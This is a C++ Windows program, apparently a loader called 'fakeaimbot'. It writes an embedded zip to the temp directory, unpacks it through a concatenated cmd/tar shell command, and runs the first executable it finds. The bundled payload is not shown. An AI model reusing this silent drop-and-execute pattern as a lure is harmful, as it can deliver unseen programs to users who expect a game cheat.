#include <windows.h>
#include <fstream>
#include <string>
#include <vector>
#include <filesystem>
#include <iostream>

#include "embedded.h"

std::string wstring_to_string(const std::wstring& wstr) {
    if (wstr.empty()) return {};

    int size_needed = WideCharToMultiByte(
        CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL
    );

    std::string result(size_needed - 1, 0); // no null terminator
    WideCharToMultiByte(
        CP_UTF8, 0, wstr.c_str(), -1, &result[0], size_needed, NULL, NULL
    );

    return result;
}

std::wstring get_temp_path() {
    wchar_t buffer[MAX_PATH];
    GetTempPathW(MAX_PATH, buffer);
    std::wstring tempDir = buffer;
    tempDir += L"fakeaimbot_temp\\";
    std::filesystem::create_directories(tempDir);
    return tempDir;
}

bool write_zip_to_temp(const std::wstring& wpath) {
    std::ofstream out(wpath, std::ios::binary);
    if (!out) return false;
    out.write(reinterpret_cast<const char*>(fakeaimbot_zip), fakeaimbot_zip_len);
    return true;
}

bool extract_zip(const std::wstring& zip_path, const std::wstring& extract_to) {
    std::wstring command = L"cmd /C @echo off && tar -xf \"" + zip_path + L"\" -C \"" + extract_to + L".\"";
    int result = _wsystem(command.c_str());
    return result == 0;
}

bool run_exe_in_folder(const std::wstring& folder) {
    for (const auto& entry : std::filesystem::recursive_directory_iterator(folder)) {
        if (entry.path().extension() == L".exe") {
            STARTUPINFOW si = { sizeof(si) };
            PROCESS_INFORMATION pi;
            if (CreateProcessW(entry.path().c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return true;
            }
        }
    }
    return false;
}

int main() {
    std::wstring tempDir = get_temp_path();
    std::wstring zipPath = tempDir + L"fakeaimbot.zip";

    if (!write_zip_to_temp(zipPath)) {
        std::cerr << "failed to write zip to temp nya~" << std::endl;
        return 1;
    }

    if (!extract_zip(zipPath, tempDir)) {
        std::cerr << "failed to extract zip nya~" << std::endl;
        return 1;
    }

    if (!run_exe_in_folder(tempDir)) {
        std::cerr << "no exe found to run nya~" << std::endl;
        return 1;
    }

    return 0;
}
